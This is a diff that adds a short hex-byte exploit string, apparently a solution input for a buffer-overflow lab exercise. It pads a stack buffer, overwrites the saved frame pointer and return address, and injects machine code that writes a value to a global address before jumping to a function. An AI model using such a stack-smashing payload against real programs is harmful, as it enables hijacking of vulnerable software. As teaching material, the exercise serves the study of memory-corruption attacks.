@@ -1,0 +1,10 @@
+CC CC CC CC CC CC CC CC CC CC
+CC CC CC CC CC CC CC CC CC CC
+CC CC CC CC CC CC CC CC CC CC
+CC CC CC CC CC CC CC CC CC CC 
+00 00 00 00 /* old ebp */
+78 33 68 55 /* function return address */
+C7 04 25 04 d1 04 08
+1B 25 59 56 /* movl $0x5659251b,0x804d104 */
+68 0c 8c 04 08 /* pushq  $0x8048c0c */
+c3 /* ret */
